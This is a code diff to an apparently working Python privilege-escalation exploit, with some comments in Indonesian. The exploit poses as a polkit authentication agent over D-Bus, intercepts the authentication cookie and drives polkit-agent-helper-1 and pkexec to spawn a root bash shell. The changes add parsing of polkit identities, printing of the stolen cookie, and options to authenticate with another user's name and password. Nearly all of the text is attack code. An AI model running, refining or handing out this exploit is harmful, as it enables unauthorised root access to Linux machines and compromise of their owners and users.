@@ -18,7 +18,7 @@ Cara kerja:
     5. Spawn polkit-agent-helper-1 (SUID root) dengan cookie + password
     6. polkitd confirm → pkexec exec bash sebagai root  → root shell
 """
-import ctypes, ctypes.util, os, sys, pwd, getpass, threading, time, shutil
+import ctypes, ctypes.util, os, sys, pwd, getpass, threading, time, shutil, argparse
 
 # ── libdbus-1 ─────────────────────────────────────────────────────────────────
 _lib_name = ctypes.util.find_library("dbus-1") or "libdbus-1.so.3"
@@ -79,9 +79,11 @@ _sig(_d.dbus_message_iter_init_append,None,             ctypes.c_void_p, ctypes.
 _sig(_d.dbus_message_iter_append_basic, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_void_p)
 _sig(_d.dbus_message_iter_open_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_char_p, ctypes.POINTER(_DBusIter))
 _sig(_d.dbus_message_iter_close_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.POINTER(_DBusIter))
-_sig(_d.dbus_message_iter_init,       ctypes.c_bool,    ctypes.c_void_p, ctypes.POINTER(_DBusIter))
-_sig(_d.dbus_message_iter_get_basic,  None,             ctypes.POINTER(_DBusIter), ctypes.c_void_p)
-_sig(_d.dbus_message_iter_next,       ctypes.c_bool,    ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_init,           ctypes.c_bool,    ctypes.c_void_p, ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_get_basic,      None,             ctypes.POINTER(_DBusIter), ctypes.c_void_p)
+_sig(_d.dbus_message_iter_next,           ctypes.c_bool,    ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_get_arg_type,   ctypes.c_int,     ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_recurse,        None,             ctypes.POINTER(_DBusIter), ctypes.POINTER(_DBusIter))
 _sig(_d.dbus_connection_register_object_path, ctypes.c_bool, ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(_VTable), ctypes.c_void_p)
 _sig(_d.dbus_connection_send_with_reply_and_block, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(_DBusError))
 _sig(_d.dbus_connection_send,         ctypes.c_bool,    ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32))
@@ -112,19 +114,97 @@ def _open(parent, typ, sig=None):
 def _close(parent, child):
     _d.dbus_message_iter_close_container(ctypes.byref(parent), ctypes.byref(child))
 
-def _read_cookie(msg):
+def _iter_get_string(it):
+    p = ctypes.c_char_p()
+    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(p))
+    return p.value.decode() if p.value else ""
+
+def _iter_get_uint32(it):
+    v = ctypes.c_uint32(0)
+    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(v))
+    return v.value
+
+def _read_begin_auth(msg):
     """
-    BeginAuthentication body signature: s s s a{ss} s a(sa{sv})
-    Cookie is arg #4 (0-indexed).  dbus_message_iter_next skips any type.
+    BeginAuthentication body: s(action_id) s(message) s(icon_name) a{ss}(details) s(cookie) a(sa{sv})(identities)
+    Returns (cookie, identities_str) where identities_str is human-readable.
     """
     it = _DBusIter()
     if not _d.dbus_message_iter_init(msg, ctypes.byref(it)):
-        return None
-    for _ in range(4):                                  # skip args 0..3
-        _d.dbus_message_iter_next(ctypes.byref(it))
-    p = ctypes.c_char_p()
-    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(p))
-    return p.value.decode() if p.value else None
+        return None, ""
+
+    args = []
+    while True:
+        t = _d.dbus_message_iter_get_arg_type(ctypes.byref(it))
+        if t == 0:
+            break
+        if t == DBUS_TYPE_STRING:
+            args.append(('s', _iter_get_string(it)))
+        else:
+            args.append((chr(t), None))
+        if not _d.dbus_message_iter_next(ctypes.byref(it)):
+            break
+
+    # Find cookie: last 's' before the final 'a' (identities array)
+    # Structure: s s [s] a{ss} s a(...)
+    # Collect all string positions
+    s_positions = [i for i, (t, _) in enumerate(args) if t == 's']
+    cookie = args[s_positions[-1]][1] if s_positions else None
+
+    # Parse identities: last arg should be array a(sa{sv})
+    # Re-read to parse identity UIDs
+    identity_uids = _read_identities(msg, len(args))
+
+    return cookie, identity_uids
+
+def _read_identities(msg, total_args):
+    """Read UID list from last arg (a(sa{sv})) of BeginAuthentication."""
+    uids = []
+    it = _DBusIter()
+    if not _d.dbus_message_iter_init(msg, ctypes.byref(it)):
+        return uids
+    # Skip to last arg (index total_args - 1)
+    for _ in range(total_args - 1):
+        if not _d.dbus_message_iter_next(ctypes.byref(it)):
+            return uids
+    # Now at the identities array a(sa{sv})
+    arr_it = _DBusIter()
+    _d.dbus_message_iter_recurse(ctypes.byref(it), ctypes.byref(arr_it))
+    while True:
+        t = _d.dbus_message_iter_get_arg_type(ctypes.byref(arr_it))
+        if t == 0:
+            break
+        # Each element is a struct (sa{sv})
+        struct_it = _DBusIter()
+        _d.dbus_message_iter_recurse(ctypes.byref(arr_it), ctypes.byref(struct_it))
+        id_type = _iter_get_string(struct_it)  # "unix-user" or "unix-group"
+        _d.dbus_message_iter_next(ctypes.byref(struct_it))
+        # dict a{sv}: read "uid" or "gid" key
+        dict_it = _DBusIter()
+        _d.dbus_message_iter_recurse(ctypes.byref(struct_it), ctypes.byref(dict_it))
+        while True:
+            dt = _d.dbus_message_iter_get_arg_type(ctypes.byref(dict_it))
+            if dt == 0:
+                break
+            entry_it = _DBusIter()
+            _d.dbus_message_iter_recurse(ctypes.byref(dict_it), ctypes.byref(entry_it))
+            key = _iter_get_string(entry_it)
+            _d.dbus_message_iter_next(ctypes.byref(entry_it))
+            # variant
+            var_it = _DBusIter()
+            _d.dbus_message_iter_recurse(ctypes.byref(entry_it), ctypes.byref(var_it))
+            uid_val = _iter_get_uint32(var_it)
+            if key in ("uid", "gid"):
+                try:
+                    name = pwd.getpwuid(uid_val).pw_name
+                except KeyError:
+                    name = f"uid={uid_val}"
+                uids.append(f"{id_type}:{name}(uid={uid_val})")
+            if not _d.dbus_message_iter_next(ctypes.byref(dict_it)):
+                break
+        if not _d.dbus_message_iter_next(ctypes.byref(arr_it)):
+            break
+    return uids
 
 def _proc_start_time(pid):
     try:
@@ -157,6 +237,13 @@ def main():
     print("║  Polkitagent UAF → root shell  [zero-dep / libdbus-1]  ║")
     print("╚══════════════════════════════════════════════════════════╝")
 
+    ap = argparse.ArgumentParser(add_help=False)
+    ap.add_argument("--auth-user", default=None,
+                    help="Username to authenticate as (default: current user). "
+                         "Must be in polkit identities (typically a sudo/wheel user).")
+    ap.add_argument("--auth-pass", default=None, help="Password (prompted if omitted)")
+    args, _ = ap.parse_known_args()
+
     # Check binaries
     if not os.path.exists(HELPER):
         sys.exit(f"[!] {HELPER} not found")
@@ -164,12 +251,18 @@ def main():
     if not pkexec:
         sys.exit("[!] pkexec not found  (apt install pkexec)")
 
-    # Credentials
-    username = pwd.getpwuid(os.getuid()).pw_name
-    try:
-        password = getpass.getpass(f"[polkit] Password for {username}: ")
-    except (EOFError, KeyboardInterrupt):
-        print(); sys.exit(0)
+    # Auth identity — default = current user, override with --auth-user
+    current_user = pwd.getpwuid(os.getuid()).pw_name
+    auth_username = args.auth_user or current_user
+    if args.auth_pass:
+        password = args.auth_pass
+    else:
+        try:
+            password = getpass.getpass(f"[polkit] Password for {auth_username}: ")
+        except (EOFError, KeyboardInterrupt):
+            print(); sys.exit(0)
+
+    username = auth_username  # used by _run_helper
 
     # Connect to system D-Bus
     err = _DBusError()
@@ -178,7 +271,8 @@ def main():
     if not conn:
         msg = err.message.decode() if err.message else "unknown"
         sys.exit(f"[!] D-Bus system bus connect failed: {msg}")
-    print(f"  [*] username   = {username}")
+    print(f"  [*] auth-user  = {auth_username}")
+    print(f"  [*] run-user   = {current_user}")
     print(f"  [*] system bus = connected")
 
     # State
@@ -192,8 +286,11 @@ def main():
         member = _d.dbus_message_get_member(message)
         if member in (b"BeginAuthentication", b"CancelAuthentication"):
             if member == b"BeginAuthentication":
-                _cookie[0] = _read_cookie(message)
+                cookie, id_uids = _read_begin_auth(message)
+                _cookie[0] = cookie
                 print(f"\n  [+] BeginAuthentication — cookie intercepted")
+                print(f"  [+] cookie     = {cookie}")
+                print(f"  [+] identities = {id_uids}")
                 sys.stdout.flush()
             # Always send an empty reply
             reply = _d.dbus_message_new_method_return(message)
